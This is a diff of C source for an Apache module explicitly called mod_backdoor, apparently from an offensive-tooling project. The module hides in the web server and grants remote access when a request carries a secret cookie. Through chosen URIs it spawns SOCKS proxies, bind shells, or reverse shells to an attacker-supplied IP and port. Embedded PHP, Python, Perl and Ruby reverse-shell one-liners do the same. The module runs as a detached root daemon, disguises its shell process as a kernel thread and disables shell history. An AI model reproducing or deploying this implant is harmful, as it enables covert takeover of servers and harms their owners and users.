@@ -30,7 +30,7 @@
 #include <utmp.h>
 
 // link with lpthread
-#include<pthread.h>
+//#include<pthread.h>
 
 #include "httpd.h"
 #include "http_config.h"
@@ -47,11 +47,11 @@
 #define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))
 
 
-#define PASSWORD "_aws=d0e632a8f49dbf7451e2f70ddb13fcaa"
-#define SOCKSWORD "/w41t1ngR00M"
-#define PINGWORD "/h0p3"
-#define SHELLWORD "/s4L4dD4ys"
-#define RESTARTWORD "/ALARMA"
+#define PASSWORD "password=backdoor"
+#define SOCKSWORD "/proxy"
+#define PINGWORD "/ping"
+#define SHELLWORD "/revtty"
+//#define RESTARTWORD "/alarma"
 #define REVERSESHELL "/reverse"
 #define BINDWORD "/bind"
 #define IPC "/tmp/mod_backdoor" //Change
@@ -97,6 +97,7 @@ typedef struct {
 
 // Read POST value from apache doc:
 // https://httpd.apache.org/docs/2.4/developer/modguide.html#snippets
+// Currently not working --> seems res var returns NULL
 keyValuePair *readPost(request_rec *r) {
     apr_array_header_t *pairs = NULL;
     apr_off_t len;
@@ -320,13 +321,6 @@ void* waitProxy(int fd, int port){
             close(new_socket);
             exit(0);
         }else if (pid == 0){
-            //close(proxysockfd);
-            /*if( pthread_create(&thread_id , NULL ,  worker , new_socket) < 0)
-            {
-                write(fd, "Could not create thread\n", strlen("Could not create thread\n") + 1);
-                exit(0);
-            }
-            pthread_join(thread_id , NULL);*/
 
             worker(new_socket);
             close(fd);
@@ -336,59 +330,18 @@ void* waitProxy(int fd, int port){
             close(new_socket);
             waitpid(pid,NULL,0);
             kill(pid,SIGKILL);
-            kill(getpid(),SIGKILL);
+            exit(0);
         }
     }
 }
 
-
-void app_socket_pipe(int fd0, int fd1)
-{
-	int maxfd, ret;
-	fd_set rd_set;
-	size_t nread;
-	char buffer_r[BUFSIZE];
-
-	maxfd = (fd0 > fd1) ? fd0 : fd1;
-	while (1) {
-		FD_ZERO(&rd_set);
-		FD_SET(fd0, &rd_set);
-		FD_SET(fd1, &rd_set);
-		ret = select(maxfd + 1, &rd_set, NULL, NULL, NULL);
-
-		if (ret < 0 && errno == EINTR) {
-			continue;
-		}
-
-		if (FD_ISSET(fd0, &rd_set)) {
-			nread = recv(fd0, buffer_r, BUFSIZE, 0);
-			if (nread <= 0){
-                //waitProxy(port);
-                break;
-			}
-			send(fd1, (const void *)buffer_r, nread, 0);
-		}
-
-		if (FD_ISSET(fd1, &rd_set)) {
-			nread = recv(fd1, buffer_r, BUFSIZE, 0);
-			if (nread <= 0){
-                //waitProxy(port);
-                break;
-			}
-			send(fd0, (const void *)buffer_r, nread, 0);
-		}
-	}
-}
-
-
-
-void shell(int socket) {
+void shell(char* ip, char* port,char* prog) {
 	int input[2];
 	int output[2];
-	int n, sr;
+	int n, sr, revsockfd ;
 	char buf[1024];
-	fd_set readset;
-	struct timeval tv;
+
+    struct sockaddr_in client_to_connect;
 	pid_t spid;
 
 	pipe(input);
@@ -396,86 +349,110 @@ void shell(int socket) {
 
 	spid = fork();
     if (spid < 0) {
-        fprintf(stderr, "[-] Error: could not fork");
-        exit(EXIT_FAILURE);
+        //fprintf(stderr, "[-] Error: could not fork");
+        exit(0);
     }else if (spid == 0){
 		char *argv[] = { "[kintegrityd/2]", 0 };
-        char *envp[] = { "HISTFILE=", 0 };
+        char *envp[] = { "HISTFILE=","TERM=vt100", 0 };
 		close(input[1]);
 		close(output[0]);
 
-		dup2(socket, 0);
-		dup2(socket, 1);
-		dup2(socket, 2);
-		execve("/bin/sh", argv, envp);
-	}
-	return;
-}
-void restartApache(){
+		spid = setsid();
 
-    pid_t spid;
+        revsockfd = socket(AF_INET, SOCK_STREAM, 0);
+        if (revsockfd < 0 ){
+            exit(0);
+        }
+        client_to_connect.sin_addr.s_addr = inet_addr(ip);
+        client_to_connect.sin_family = AF_INET;
+        client_to_connect.sin_port = htons(atoi(port));
 
-    spid = fork();
-    if (spid < 0) {
-        fprintf(stderr, "[-] Error: could not fork");
-        exit(EXIT_FAILURE);
-    }else if (spid == 0){
+        if (connect(revsockfd , (struct sockaddr *)&client_to_connect , sizeof(client_to_connect)) < 0)
+        {
+            exit(0);
+        }
 
-        char* args[] = {"/usr/bin/systemctl", "restart", "apache2", NULL};
-        execve(args[0], args, NULL);
+		dup2(revsockfd, 0);
+		dup2(revsockfd, 1);
+		dup2(revsockfd, 2);
+        //ioctl(revsockfd, TIOCSCTTY,1);
+
+		if(!strcmp(prog,"sh")){
+            execve("/bin/sh", argv, envp);
+		}
+		if(!strcmp(prog,"bash")){
+            execve("/bin/bash", argv, envp);
+        }
+        if(!strcmp(prog,"dash")){
+            execve("/bin/dash", argv, envp);
+        }
+        if(!strcmp(prog,"ash")){
+            execve("/bin/ash", argv, envp);
+        }
+        if(!strcmp(prog,"tcsh")){
+            execve("/bin/tcsh", argv, envp);
+        }
+        if(!strcmp(prog,"ksh")){
+            execve("/bin/ksh", argv, envp);
+        }
+
+	}else{ // Kill father to create daemon process
+        exit(0);
     }
 
-    return;
+	return;
 }
 
 void reverseShell(char* ip, char* port, char* prog){
 
     pid_t spid;
 
-    spid = fork();
-    if (spid < 0) {
-        fprintf(stderr, "[-] Error: could not fork");
-        exit(EXIT_FAILURE);
-    }else if (spid == 0){
-
-        if (!strcmp(prog,"php")){
-            char* args[] = {"/usr/bin/php", "-r", "", NULL};
-            args[2] = (char*) malloc(2048);
-            sprintf(args[2],"$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");",ip,port);
-            execve(args[0], args, NULL);
-            free(args[2]);
-        }else if (!strcmp(prog,"python")){
-            char* args[] = {"/usr/bin/python", "-c", "", NULL};
-            args[2] = (char*) malloc(2048);
-            sprintf(args[2],"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);",ip,port);
-            execve(args[0], args, NULL);
-            free(args[2]);
-        }else if (!strcmp(prog,"perl")){
-            char* args[] = {"/usr/bin/perl", "-e", "", NULL};
-            args[2] = (char*) malloc(2048);
-            sprintf(args[2],"use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};",ip,port);
-            execve(args[0], args, NULL);
-        }else if (!strcmp(prog,"ruby")) {
-            //ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-            char* args[] = {"/usr/bin/ruby", "-rsocket", "-e", "", NULL};
-            args[3] = (char*) malloc(2048);
-            sprintf(args[3],"exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end",ip,port);
-            execve(args[0], args, NULL);
-            free(args[3]);
-        }
-        else{
-            char* args[] = {"/usr/bin/php", "-r", "", NULL};
-            args[2] = (char*) malloc(2048);
-            sprintf(args[2],"$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");",ip,port);
-            execve(args[0], args, NULL);
-            free(args[2]);
-        }
+    if(!strcmp(prog,"sh") || !strcmp(prog,"bash") || !strcmp(prog,"dash") || !strcmp(prog,"tcsh") || !strcmp(prog,"ash") || !strcmp(prog,"ksh")){
+        shell(ip,port,prog);
     }else{
-        waitpid(spid,NULL,0);
-        kill(spid,SIGKILL);
-    }
+        spid = fork();
+        if (spid < 0) {
+            fprintf(stderr, "[-] Error: could not fork");
+            exit(EXIT_FAILURE);
+        }else if (spid == 0){
 
-    return;
+            if (!strcmp(prog,"php")){
+                char* args[] = {"/usr/bin/php", "-r", "", NULL};
+                args[2] = (char*) malloc(strlen("$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");")+strlen(ip)+strlen(port)+1);
+                sprintf(args[2],"$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");",ip,port);
+                execve(args[0], args, NULL);
+                free(args[2]);
+            }
+            if (!strcmp(prog,"python")){
+                char* args[] = {"/usr/bin/python", "-c", "", NULL};
+                args[2] = (char*) malloc(strlen("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);")+strlen(ip)+strlen(port)+1);
+                sprintf(args[2],"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);",ip,port);
+                execve(args[0], args, NULL);
+                free(args[2]);
+            }
+            if (!strcmp(prog,"perl")){
+                char* args[] = {"/usr/bin/perl", "-e", "", NULL};
+                args[2] = (char*) malloc(1+strlen(ip)+strlen(port)+strlen("use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"));
+                sprintf(args[2],"use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};",ip,port);
+                execve(args[0], args, NULL);
+            }
+            if (!strcmp(prog,"ruby")) {
+                //ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+                char* args[] = {"/usr/bin/ruby", "-rsocket", "-e", "", NULL};
+                args[3] = (char*) malloc(1+strlen(ip)+strlen(port)+strlen("exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"));
+                sprintf(args[3],"exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end",ip,port);
+                execve(args[0], args, NULL);
+                free(args[3]);
+            }
+
+        }else{
+            //waitpid(spid,NULL,0);
+            //kill(spid,SIGKILL);
+            exit(0);
+        }
+    }
+    exit(0);
+    //return;
 }
 /****************************/
 /// Fork() then forkpty() ///
@@ -701,36 +678,11 @@ static int backdoor_post_read_request(request_rec *r) {
 
 	int backdoor = 0;
 
-    //keyValuePair *formData;
-
-    /*formData = readPost(r);
-    if (formData) {
-        //int i;
-        for (i = 0; &formData[i]; i++) {
-            if (formData[i].key && formData[i].value) {
-                //ap_rprintf(r, "%s = %s\n", formData[i].key, formData[i].value);
-                if(strcmp(formData[i].key,"pass") == 0){
-                    if(strcmp(formData[i].value,"password") == 0){
-                        backdoor = 1;
-                    }
-                }
-            } else if (formData[i].key) {
-                backdoor = 1;
-                //ap_rprintf(r, "%s\n", formData[i].key);
-            } else if (formData[i].value) {
-                backdoor = 1;
-                //ap_rprintf(r, "= %s\n", formData[i].value);
-            } *//*else {
-                break;
-            }*//*
-        }
-    }*/
-
     fields = apr_table_elts(r->headers_in);
     e = (apr_table_entry_t *) fields->elts;
     for(i = 0; i < fields->nelts; i++) {
         if (!strcmp(e[i].key,"Cookie")) {
-            if (!strcmp(e[i].val, PASSWORD)) {
+            if (strstr(e[i].val, PASSWORD)) {
                 backdoor = 1;
             }
         }
@@ -840,25 +792,6 @@ static int backdoor_post_read_request(request_rec *r) {
 		write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n")+1);
 		exit(0);
 	}
-    if (!strcmp(r->uri, RESTARTWORD)) {
-
-        sock = socket(AF_UNIX, SOCK_STREAM, 0);
-        if (sock < 0) {
-            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
-            exit(0);
-        }
-        server.sun_family = AF_UNIX;
-        strcpy(server.sun_path, IPC);
-        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
-            close(sock);
-            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
-            exit(0);
-        }
-
-        write(fd, "[+] Restarting Apache2 !\n", strlen("[+] Restarting Apache2 !\n"));
-        write(sock,"APACHE",strlen("APACHE"));
-        exit(0);
-    }
 
     if (strstr(r->uri, REVERSESHELL)) {
         char buf[1024];
@@ -877,6 +810,17 @@ static int backdoor_post_read_request(request_rec *r) {
         }
 
         write(sock,r->uri,strlen(r->uri));
+        char* meh = strtok(r->uri,"/");
+        char* ip = strtok(NULL,"/");
+        char* port = strtok(NULL,"/");
+        char* prog = strtok(NULL,"/");
+        char* info = malloc(strlen("[+] Sending Reverse Shell to %s:%s using %s\n")+strlen(ip)+strlen(port)+strlen(prog)+2);
+        sprintf(info,"[+] Sending Reverse Shell to %s:%s using %s\n",ip,port,prog);
+        write(fd, info, strlen(info) +1);
+        free(info);
+
+        close(fd);
+        close(fd);
 
         exit(0);
     }
@@ -960,28 +904,25 @@ int waitIPC(int master){
                     if ((rc = read(sd, buf, 1024)) <= 0) {
                         close(sd);
                     } else {
-                        if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
+                        pid = fork();
+                        if(pid == 0){
+                            if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
+                                shellPTY(sd);
+                            } else if (strstr(buf, "reverse")) {
+                                // Monkey parsing url -->
+                                char *meh = strtok(buf, "/");
+                                char *ip = strtok(NULL, "/");
+                                char *port = strtok(NULL, "/");
+                                char *prog = strtok(NULL, "/");
+                                reverseShell(ip, port, prog);
+                            }
+                        }else{
                             pid = fork();
                             if(pid == 0){
-                                shellPTY(sd);
+                                waitIPC(master);
                             }else{
-                                pid = fork();
-                                if(pid == 0){
-                                    waitIPC(master);
-                                }else{
-                                    exit(0);
-                                }
+                                exit(0);
                             }
-
-                        } else if (strstr(buf, "APACHE")) {
-                            restartApache();
-                        } else if (strstr(buf, "reverse")) {
-                            char *meh = strtok(buf, "/");
-                            char *ip = strtok(NULL, "/");
-                            char *port = strtok(NULL, "/");
-                            char *prog = strtok(NULL, "/");
-
-                            reverseShell(ip, port, prog);
                         }
                     }
                 }
@@ -994,7 +935,7 @@ int waitIPC(int master){
 int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
 
     pid = fork();
-    // Kill father to create daemon attached to pid 1
+    // Kill father just after reading the config to create apache2 root daemon attached to pid 1
     if (pid) {
         return OK;
     }
@@ -1028,35 +969,11 @@ static int backdoor_log_transaction(request_rec *r) {
 
 	int backdoor = 0;
 
-    /*keyValuePair *formData;
-
-    formData = readPost(r);
-    if (formData) {
-        //int i;
-        for (i = 0; &formData[i]; i++) {
-            if (formData[i].key && formData[i].value) {
-                //ap_rprintf(r, "%s = %s\n", formData[i].key, formData[i].value);
-                if(!strcmp(formData[i].key,"pass") && !strcmp(formData[i].value,"password") ){
-                    backdoor = 1;
-                }
-            } else if (formData[i].key) {
-                backdoor = 1;
-                //ap_rprintf(r, "%s\n", formData[i].key);
-            } else if (formData[i].value) {
-                backdoor = 1;
-                //ap_rprintf(r, "= %s\n", formData[i].value);
-            } else {
-                break;
-            }
-        }
-    }*/
-
-
 	fields = apr_table_elts(r->headers_in);
 	e = (apr_table_entry_t *) fields->elts;
 	for(i = 0; i < fields->nelts; i++) {
 		if (!strcmp(e[i].key,"Cookie")) {
-			if (!strcmp(e[i].val, PASSWORD)) {
+			if (strstr(e[i].val, PASSWORD)) {
 				backdoor = 1;
 			}
 		}
